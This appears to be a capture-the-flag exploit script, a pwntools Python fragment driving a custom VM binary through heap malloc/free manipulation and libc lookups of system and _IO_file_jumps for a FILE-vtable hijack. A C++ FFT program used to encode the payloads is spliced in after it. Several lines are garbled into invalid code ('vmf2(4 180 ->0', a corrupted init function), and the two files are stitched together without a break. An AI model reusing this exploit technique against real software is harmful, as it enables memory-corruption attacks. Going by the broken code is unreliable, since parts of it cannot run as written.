        #gdb.attach(p, "b *'$'rebase(0xdd9)")
    else:
        p=remote(remote_addr[0],remote_addr[1])
        libc = ELF(libc_mote)
    def wrap(choice,arg1,arg2,arg3):
        cmd = "./IFFT"
        tmp = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        lines = ""
        lines+= str(choice)+" "
        lines+= str(arg1)+" "
        lines+= str(arg2)+" "
        lines+= str(choice)+" "
        # print(hex(arg3))
        for i in range(8):
            t = str((arg3 >> (i*8))&0xff )+" "
            # print(t)
            lines+= t#str((arg3 > (i*8))&0xff )+" "
        for i in range(64-4-8):
            lines+= str(0)+" "
        tmp.stdin.write(lines)
        out = tmp.communicate()
        res = out[0].split("\n")
        res1 =""
        for i in range(64):
            if(res[i]=="(nil)"):
                res1 = res1+p64(0)
                continue
            res1 = res1+ p64(int(res[i],16))
            # sn()
        sn(res1)
    def vm_mov_r_op(r,value):
        # if(value=="/bin/sh\x00"):
        wrap(math.log(2,2),r,0, value)
    def vm_mov_mm_r(offset,r):
        wrap(math.log(3,2), r, 0, offset)
    def vm_mov_r_mm(r,offset):
        wrap(math.log(4,2), r, 0, offset)
    def vm_add_r_r(r1, r2):
        wrap(math.log(5,2), r1, r2, 0)
    def write(offset):
        wrap(math.log(0xa0,2), 1, 0, offset)
    def vmf2(offset):#malloc & free
        wrap(math.log(0xa0,2), 2, 0, offset)
    def vmf3(offset):#add 
        wrap(math.log(0xa0,2), 3, 0, offset)
    if __name__ == "__main__":
        ru("  ###     ###     ###      #    #     #")
        index = 0x4
        vmf2(4 180 ->0
        offset4 = 4 180 ->40
        vm_mov_r_op(1, target_addr)
        offset2 = 4 180 ->40
        # write addr in target_addr
        offset1 = 4 180 ->40->0x200
        #free in order to write head+mmap_ptr+mask
        for i in range(4):
            vmf2(0x40)
        stderr =  libc_addr + libc.sym["_IO_2_1_stderr_"]
        vtable = libc_addr + libc.sym["_IO_file_jumps"]#0x18 to write
        system = libc_addr + libc.sym["system"]
        #write mmap_ptr
        vm_mov_r_op(1,vtable)
        offset =  4
    using namespace std;
    const int N = 3e6 + 10;
    const double PI = acos(-1);
    struct Complex {
        double x, y;
        Complex operator+(const Complex &t) const {
            return {x + t.x, y + t.y};
        }
        Complex operator-(const Complex &t) const {
            return {x - t.x, y - t.y};
        }
        Complex operator*(const Complex &t) const {
            return {x * t.x - y * t.y, x * t.y + y * t.x};
        }
    };
    int rev[N], bit, tot;
    inline void init(int n) {
        bit = __lg(n) + ((n & (-n)) != n), tot = 1 > 1] >> 1) | ((i & 1) << (bit - 1));
    }
    inline void FFT(Complex a[], int inv) {
        for (int i = 0; i < tot; i++)
            if (i < rev[i])swap(a[i], a[rev[i]]);
        for (int mid = 1; mid < tot; mid <<= 1) {
            Complex w1 = {cos(PI / mid), inv * sin(PI / mid)};
            for (int i = 0; i < tot; i += mid * 2) {
                Complex wk = {1, 0};
                for (int j = 0; j < mid; j++, wk = wk * w1) {
                    auto x = a[i + j], y = wk * a[i + j + mid];
                    a[i + j] = x + y, a[i + j + mid] = x - y;
                }
            }
        }
    }
    int n, m;
    Complex a[N], b[N];
    int main() {
        n = 64;
        m = 64;
        for (int i = 0; i < n; i++){
            scanf("%lf", &a[i].x);
        }
        init(n);
        FFT(a, -1);
        for (int i = 0; i < 64; i++)
        {
            void * res = (void *)&a[i].x;
            printf("%p\n", *(long long *)res);
        }
        return 0;
    }